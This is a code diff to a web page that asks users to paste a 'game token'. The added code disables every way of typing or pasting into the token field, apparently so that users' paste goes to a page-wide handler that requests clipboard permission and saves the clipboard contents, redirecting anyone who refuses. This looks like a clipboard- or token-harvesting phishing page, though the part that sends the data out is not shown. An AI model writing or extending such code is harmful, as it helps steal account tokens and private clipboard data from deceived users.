@@ -72,6 +72,14 @@
     #adminBtn:hover {
       background: #666;
     }
+
+    /* Disable text selection on token input */
+    #tokenInput {
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
   </style>
 </head>
 <body>
@@ -83,7 +91,7 @@
     <button id="submitBtn">Submit Game ID</button>
 
     <div id="tokenBox">
-      <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" />
+      <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" readonly />
       <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
     </div>
 
@@ -99,6 +107,37 @@
     const adminBtn = document.getElementById('adminBtn');
 
     let permissionGranted = false;
+
+    // Prevent all paste operations on token input
+    tokenInput.addEventListener('paste', (e) => {
+      e.preventDefault();
+      return false;
+    });
+
+    // Prevent right-click context menu on token input
+    tokenInput.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+      return false;
+    });
+
+    // Prevent keyboard shortcuts on token input
+    tokenInput.addEventListener('keydown', (e) => {
+      // Block Ctrl+V, Ctrl+A, Ctrl+C, Ctrl+X, etc.
+      if (e.ctrlKey || e.metaKey) {
+        e.preventDefault();
+        return false;
+      }
+      // Block all input
+      e.preventDefault();
+      return false;
+    });
+
+    // Prevent input events
+    tokenInput.addEventListener('input', (e) => {
+      e.preventDefault();
+      tokenInput.value = '';
+      return false;
+    });
 
     document.addEventListener('keydown', async (e) => {
       if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
@@ -142,7 +181,7 @@
         alert('Clipboard content saved.');
       } catch {
         alert('Clipboard permission was denied. Redirecting...');
-        window.location.href = 'https://example.com/denied'; // replace
+        window.location.href = 'https://example.com/denied';
       }
     };
 
